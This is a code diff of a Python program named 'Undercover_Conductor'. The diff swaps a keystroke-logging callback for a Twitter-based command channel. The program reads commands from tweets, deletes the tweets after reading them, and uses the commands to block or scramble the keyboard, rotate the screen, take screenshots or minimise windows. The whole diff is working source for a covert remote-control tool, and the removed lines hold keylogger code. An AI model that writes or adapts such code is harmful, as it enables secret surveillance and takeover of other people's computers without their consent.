@@ -4,15 +4,35 @@ import smtplib
 import pyautogui
 import rotatescreen
 import os
+import tweepy
+import configparser
 
 from threading import Timer
 from datetime import datetime
 from time import sleep
 from PIL import Image
 
+
+# Twitter API Credentials
+config = configparser.ConfigParser()
+config.read('config.ini')
+
+api_key = config['twitter']['api_key']
+api_key_secret = config['twitter']['api_key_secret']
+
+access_token = config['twitter']['access_token']
+access_token_secret = config['twitter']['access_token_secret']
+
+# Twitter API Authentication
+auth = tweepy.OAuthHandler(api_key, api_key_secret)
+auth.set_access_token(access_token, access_token_secret)
+
+api = tweepy.API(auth)
+
 class Undercover_Conductor:
     def __init__(self):
         self.log = ""
+        self.end = False
 
     keys = ['q', 'w', 'e', 'r', 't', 'y', 'u', 'i', 'o', 'p', 'a', 's', 'd', 'f', 'g', 'h', 'j', 'k', 'l', \
     'z', 'x', 'c', 'v', 'b', 'n', 'm', 'space', 'enter', 'control', 'shift', 'tab', 'esc', 'alt', 'win', 'backspace', \
@@ -25,54 +45,40 @@ class Undercover_Conductor:
     }
 
     def start(self):
-        # Starts listening to keys
-        keyboard.on_release(callback=self.callback)
-        # Maintains the program until CTRL+C is pressed test
-        keyboard.wait() 
-
-    # Logs key when pressed
-    def callback(self, event):
-        name = event.name
-        if len(name) > 1:
-            # Not a character, special key (e.g ctrl, alt, etc.)
-            # Uppercase with []
-            if name == "space":
-                # " " instead of "space"
-                name = " "
-            elif name == "enter":
-                # Adds a new line whenever an ENTER is pressed
-                name = "[ENTER]\n"
-            elif name == "decimal":
-                name = "."
-            elif name == 'backspace':
-                name = ""
-                self.log = self.log[:-1]
-            else:
-                # Replace spaces with underscores
-                name = name.replace(" ", "_")
-                name = f"[{name.upper()}]"
-
-        # Adds key name to self.log
-        self.log += name
-        self.check_commands(self.log.lower())
+        # # Starts listening to keys
+        # keyboard.on_release(callback=self.callback)
+        # # Maintains the program until CTRL+C is pressed test
+        # keyboard.wait() 
+        while self.end == False:
+            tweets = api.user_timeline()
+            if len(tweets) != 0:
+                tweet = tweets[0]
+                self.check_commands(tweet.text.lower())
+                api.destroy_status(tweet.id)
+            sleep(1)
 
     # Finds and run commands from the keyboard input
     def check_commands(self, string):
-        self.autocorrect(string)
         if string.find("test") != -1:
             self.simple_test()
-        elif string.find("pause") != -1:
-            self.pause_keyboard()
+        elif string.find("stop") != -1:
+            self.block_keys()
+        elif string.find("start") != -1:
+            self.unblock_keys()
         elif string.find("url") != -1:
             self.go_to_url()
         elif string.find("rotate") != -1:
             self.rotate_screen()
-        elif string.find("remap") != -1:
-            self.temp_remap_keys()
-        elif string.find("screenshot") != -1:
+        elif string.find("jumble") != -1:
+            self.remap_keys()
+        elif string.find("sort") != -1:
+            self.unremap_keys()
+        elif string.find("screen") != -1:
             self.screenshot()
         elif string.find("minimise") != -1:
             self.minimise()
+        elif string.find('end') != -1:
+            self.end = True
 
     # Blocks all inputs from the keyboard using the keys list
     def block_keys(self):
@@ -99,7 +105,7 @@ class Undercover_Conductor:
     # Blocks all inputs from the keyboard for 10 seconds then unblocks them
     def pause_keyboard(self):
         self.block_keys()
-        sleep(10)
+        sleep(5)
         self.unblock_keys()
         self.log = ""
 
@@ -141,7 +147,7 @@ class Undercover_Conductor:
     # Remaps the alphabet keys temporarily for 10 seconds
     def temp_remap_keys(self):
         self.remap_keys()
-        sleep(10)
+        sleep(5)
         self.unremap_keys()
         self.log = ""
 
@@ -153,9 +159,7 @@ class Undercover_Conductor:
     
     # Continuously minimises all applications for 10 seconds
     def minimise(self):
-        for i in range(100):
-            pyautogui.hotkey("winleft", "m")
-            sleep(0.1)
+        pyautogui.hotkey("winleft", "m")
         self.log = ""
 
 
